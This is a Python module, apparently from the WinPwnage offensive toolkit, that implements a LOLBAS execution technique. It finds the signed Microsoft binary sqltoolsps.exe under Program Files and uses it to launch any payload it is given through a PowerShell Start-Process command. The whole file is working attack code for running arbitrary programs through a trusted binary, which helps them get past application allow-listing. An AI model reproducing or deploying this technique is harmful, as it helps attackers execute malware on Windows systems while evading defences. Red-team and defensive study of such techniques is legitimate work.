import os
import random
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqltoolsps/

sqltoolsps_info = {
	"Description": "Execute payload using sqltoolsps binary",
	"Id": "15",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_sqltoolsps",
	"Function Payload": True,
}


def exec_sqltoolsps(payload):
	if payloads().exe(payload):
		paths = []
		binary = "sqltoolsps.exe"

		print_info("Searching for ({binary}) in Program Files directory".format(binary=binary))
		for root, dirs, files in os.walk(os.environ["ProgramFiles"]):
			for name in files:
				if name.lower() == binary:
					paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({binary}) not found on system".format(binary=binary))
			return False
		else:
			print_info("Located ({binary}) binary".format(binary=binary))
			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))
			exit_code = process().create(path,
						params="-noprofile -command Start-Process {payload}".format(payload=payload),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))
				return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False				